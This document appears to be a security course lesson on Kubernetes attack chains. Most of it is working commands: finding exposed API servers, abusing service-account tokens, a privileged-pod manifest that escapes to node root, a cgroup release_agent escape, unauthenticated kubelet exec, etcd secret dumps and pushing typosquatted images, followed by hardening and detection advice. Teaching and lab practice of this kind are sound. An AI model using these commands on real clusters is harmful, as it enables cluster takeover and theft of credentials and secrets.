# Kubernetes Attack Chains

A modern application platform is also a credential vault, secrets store, and a fast highway to every other workload in the cluster. This lesson maps the attacker's journey from "I can run a pod" to "I own the control plane" — and shows the choke points defenders should harden first.

> [!warning] Cluster impact
> Run these only against your own clusters or KubeGoat / Kubernetes Goat / kube-bench labs. A misconfigured RBAC change in a shared cluster can break production for everyone.

## The threat model in one diagram

![Kubernetes Attack Surface](/images/lessons/kubernetes_attack_surface_en.png)

Five entry points: leaked kubeconfig, exposed API/dashboard, vulnerable workload, insecure kubelet, supply-chain image. Each below.

## 1. Recon — what's exposed

```terminal
# Find exposed Kubernetes APIs
shodan search 'product:"Kubernetes"'
shodan search 'http.title:"Kubernetes Dashboard"'
fofa.info 'app="kubernetes" && country="XX"'

# Once you have an IP:
kubectl --insecure-skip-tls-verify --server=https://API:6443 get nodes
# If anonymous-auth=true (still default in some installs) you read everything
kubectl --insecure-skip-tls-verify --server=https://API:6443 auth can-i --list
```

## 2. Pod RCE → cluster

You popped a pod via app-level RCE (SSRF, deserialization, etc.). Standard recon:

```terminal
# Inside the pod
ls /var/run/secrets/kubernetes.io/serviceaccount/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# What can this SA do?
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -X POST -H 'Content-Type: application/json' \
  -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}"
```

## 3. RBAC abuse — common privilege paths

The RBAC verbs that = root in a cluster:

| Verb on resource | Why it equals admin |
|------------------|---------------------|
| `create pods` (any ns) | Mount the host filesystem, escape to node |
| `create pods/exec` | Exec into any existing pod (cred theft) |
| `get/list secrets` | Read service-account tokens, including admin |
| `escalate clusterroles` | Grant yourself any verb |
| `bind / clusterrolebinding` | Bind cluster-admin to yourself |
| `impersonate users/groups` | Become any user including system:masters |
| `patch nodes` | Modify node labels for taint-evasion / scheduling |

```terminal
# Privilege escalation via 'create pods' (mount node FS)
cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata: { name: pwn, namespace: default }
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine
    command: ["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","sh"]
    securityContext: { privileged: true }
    volumeMounts: [{ name: host, mountPath: /host }]
  volumes: [{ name: host, hostPath: { path: / } }]
EOF
kubectl exec -it pwn -- sh
# You're now PID 1 of the host node, root.
```

## 4. Pod escape primitives

If `privileged: true` is denied, lesser misconfigurations still escape:

| Misconfig | Escape primitive |
|-----------|------------------|
| `hostPID: true` | `nsenter` into PID 1 once you have CAP_SYS_PTRACE |
| `hostNetwork: true` | Talk to kubelet on `127.0.0.1:10250`, IMDS on cloud |
| `hostPath: /` mount | Write to `/etc/cron.d/`, drop SSH key in `/root/.ssh/` |
| `CAP_SYS_ADMIN` | Mount cgroup release_agent, run binary as host root |
| Docker socket mounted | `docker run --privileged` to spawn container with host root |
| RunAsUser 0 + no AppArmor | Various kernel-LPE chains |

### release_agent escape (still works on many clusters)

```terminal
# inside privileged pod with CAP_SYS_ADMIN
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
HOST_PATH=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$HOST_PATH/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo 'id > /tmp/host_id' >> /cmd && chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /tmp/host_id
```

## 5. Insecure kubelet (port 10250)

If `--anonymous-auth=true` and `--authorization-mode=AlwaysAllow`, kubelet on every node hands you exec on every pod:

```terminal
curl -sk https://NODE:10250/pods | jq '.items[].metadata.name'
# Run a command in any pod:
curl -sk -X POST 'https://NODE:10250/run/<ns>/<pod>/<container>?cmd=id'
```

## 6. etcd extraction

If you reach etcd (port 2379) without client-cert auth, you read **every secret in the cluster** — including the cluster-admin kubeconfig and all SA tokens.

```terminal
ETCDCTL_API=3 etcdctl --endpoints=https://etcd-host:2379 \
  --cacert=ca.crt --cert=apiserver.crt --key=apiserver.key \
  get / --prefix --keys-only | head
ETCDCTL_API=3 etcdctl ... get /registry/secrets/kube-system/admin-key
```

> [!danger] etcd = game over
> Backups of etcd in S3 buckets without encryption are a real recurring finding. Treat etcd dumps with the same handling as a domain controller's NTDS.dit.

## 7. Supply-chain — image registries

```terminal
# Find exposed registries
shodan search 'product:"Docker Registry" "/v2/"'

# Pull a private image without auth (misconfigured registry)
curl https://registry.target/v2/_catalog
curl https://registry.target/v2/<image>/manifests/latest -H "Accept: application/vnd.docker.distribution.manifest.v2+json"

# Inject a malicious layer / push a typosquat tag
docker tag pwn:latest registry.target/library/nginx:1.25.3-alpine
docker push registry.target/library/nginx:1.25.3-alpine
```

## End-to-end (purple-team scenario)

```terminal
# 1. Exposed dashboard (anonymous read on a /metrics endpoint via kube-state-metrics)
curl https://target/metrics | grep kube_pod_info | head

# 2. Find a pod running a vulnerable app, pop it via SSRF
curl 'https://target/api?url=http://app/internal'

# 3. Inside, list SA permissions; can-i create pods → yes (default-edit role)
# 4. Create privileged pod that mounts /
# 5. nsenter to host, dump kubelet creds
# 6. Use kubelet creds to exec on apiserver pod, dump --token-auth-file
# 7. With cluster-admin token, etcd dump → all secrets, including cloud creds
# 8. Pivot to cloud (IRSA / Workload Identity)
```

## Defender priorities

1. **Disable anonymous auth** on apiserver and kubelet — `--anonymous-auth=false`.
2. **PodSecurityAdmission `restricted`** on every namespace except where waived. Block `privileged`, `hostPID`, `hostNetwork`, `hostPath`.
3. **Network policies default-deny** between namespaces. Most clusters allow east-west by default — fix that.
4. **Encrypt secrets at rest** with KMS provider (envelope encryption); rotate.
5. **Image admission**: signature verification (Cosign / Sigstore), block latest tags.
6. **RBAC review** quarterly: search for `escalate`, `bind`, `impersonate`, `* on *`.
7. **Audit log to SIEM** with `requestReceived` stage; alert on `pods/exec`, `secrets/get` outside platform SAs.

## Detection ideas

| Telemetry | Detection |
|-----------|-----------|
| `pods/exec` audit | Any human-user exec in production namespace |
| Anon GET `/api/v1/namespaces/.../secrets` | Reconnaissance attempt |
| Pod created with `hostPath: /` | Critical alert — almost always malicious |
| kubelet 10250 from non-control-plane | Lateral movement |
| etcd query latency spike + bulk reads | Possible dump |
